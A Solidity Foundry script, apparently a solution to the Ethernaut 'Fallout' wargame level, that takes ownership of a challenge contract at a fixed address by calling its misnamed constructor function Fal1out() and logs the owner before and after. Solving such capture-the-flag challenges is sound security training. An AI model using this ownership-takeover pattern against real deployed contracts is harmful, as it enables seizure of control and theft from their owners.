// SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../instances/Ilevel02.sol";

contract Attacker is Script {
    Fallout level2 = Fallout(0xE034b39E70D59f4b3b8881cD8Bbc3a4C86D26dC0);

    function run() external {
        vm.startBroadcast();
        console.log("previous owner: ", level2.owner());
        level2.Fal1out();
        console.log("updated owner: ", level2.owner());

        vm.stopBroadcast();
    }
}
